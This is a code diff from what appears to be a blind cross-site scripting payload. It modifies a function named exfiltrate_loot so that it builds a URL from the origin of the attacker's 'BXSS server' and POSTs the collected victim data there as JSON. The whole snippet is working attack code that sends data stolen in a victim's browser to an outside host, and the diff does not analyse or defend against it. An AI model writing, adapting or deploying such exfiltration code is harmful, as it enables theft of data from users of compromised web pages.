@@ -46,10 +46,12 @@ function collect_data() {
 
 
 function exfiltrate_loot() {
+  // Get the URI of our BXSS server
+  var uri = new URL(curScript.src);
+  var exf_url = uri.origin + "/c"
+  
   var xhr = new XMLHttpRequest()
-  const url = curScript.src.split("?")[0] + "c"
-  xhr.open("POST", url, true)
-
+  xhr.open("POST", exf_url, true)
   xhr.setRequestHeader("Content-Type", "application/json")
   xhr.send(JSON.stringify(collected_data))
 }
